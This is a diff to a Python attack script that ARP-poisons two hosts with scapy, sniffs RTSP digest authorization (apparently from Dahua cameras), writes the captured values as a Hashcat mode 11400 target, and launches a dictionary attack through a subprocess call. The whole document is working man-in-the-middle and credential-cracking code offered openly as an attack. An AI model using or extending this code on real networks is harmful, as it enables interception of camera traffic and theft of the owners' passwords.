@@ -2,8 +2,21 @@ from scapy.layers.l2 import getmacbyip, get_if_addr, get_if_hwaddr, sendp, Ether
 from scapy.layers.inet import TCP
 from scapy.all import sniff, conf
 from threading import Thread
+import subprocess
 import hashlib
 import sys
+
+
+def output_hashcat_target(output, user, realm, method, uri, nonce, hash):
+    """
+    Generate a target compatible with Hashcat mode 11400 and output
+    it to the contents of the specified output file.
+    """
+
+    target = f"$sip$***{user}*{realm}*{method}**{uri}**{nonce}****MD5*{hash}"
+    file = open(output, "w")
+    file.write(target + "\n")
+    file.close()
 
 
 def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
@@ -20,7 +33,7 @@ def arp_poison(iface, iface_mac, target_ip, target_mac, source_ip):
     packet[ARP].psrc = source_ip
     packet[ARP].hwdst = target_mac
     packet[ARP].pdst = target_ip
-    sendp(packet, iface=iface, inter=1, loop=1)
+    sendp(packet, iface=iface, inter=1, loop=1, verbose=False)
 
 
 def dahua_rtsp_hash(username, realm, password, method, uri, nonce):
@@ -81,38 +94,56 @@ def sniff_rtsp_authorization(source_ip, target_ip):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
+    target_file = "target.txt"
+    cracked_file = "cracked.txt"
+
+    if len(sys.argv) < 4:
         print("Incorrect number of arguments!")
         exit(1)
 
+    # Read command line arguments
     victim_ip = sys.argv[1]
     victim_mac = getmacbyip(victim_ip)
-
     spoof_ip = sys.argv[2]
     spoof_mac = getmacbyip(spoof_ip)
+    dictionary_file = sys.argv[3]
 
+    # Get current device's IP and MAC
     attacker_iface = conf.iface
     attacker_ip = get_if_addr(attacker_iface)
     attacker_mac = get_if_hwaddr(attacker_iface)
 
+    # Wrapper function for poisoning the victim
     def poison_victim():
         arp_poison(attacker_iface, attacker_mac,
                    victim_ip, victim_mac, spoof_ip)
 
+    # Wrapper function for poisoning the target
     def poison_spoof():
         arp_poison(attacker_iface, attacker_mac,
                    spoof_ip, spoof_mac, victim_ip)
 
+    # Start daemon threads which continually poison
+    print("Starting continually poisoning...")
     Thread(target=poison_victim, daemon=True).start()
     Thread(target=poison_spoof, daemon=True).start()
 
+    # Wrapper function for sniffing RTSP packets
     def sniff_wrapper():
         sniff_rtsp_authorization(victim_ip, spoof_ip)
 
+    # Start daemon thread and wait for it to have found a packet
+    print("Starting RTSP packet sniffing...")
     sniff_thread = Thread(target=sniff_wrapper, daemon=True)
     sniff_thread.start()
     sniff_thread.join()
 
-    # Get the found authorization fields
-    fields = sniff_result
-    print(fields)
+    # A packet has been found, so output to Hashcat format
+    print("Packet found! Stopping poisoning and sniffing...")
+    output_hashcat_target(target_file, sniff_result["username"], sniff_result["realm"],
+                          sniff_result["method"], sniff_result["uri"], sniff_result["nonce"], sniff_result["response"])
+
+    # Launch a dictionary attack on the target
+    print("Starting Hashcat dictionary attack...")
+    subprocess.run(["hashcat", "-m", "11400", "-a", "0", target_file,
+                   dictionary_file, "--potfile-disable", "-o", cracked_file])
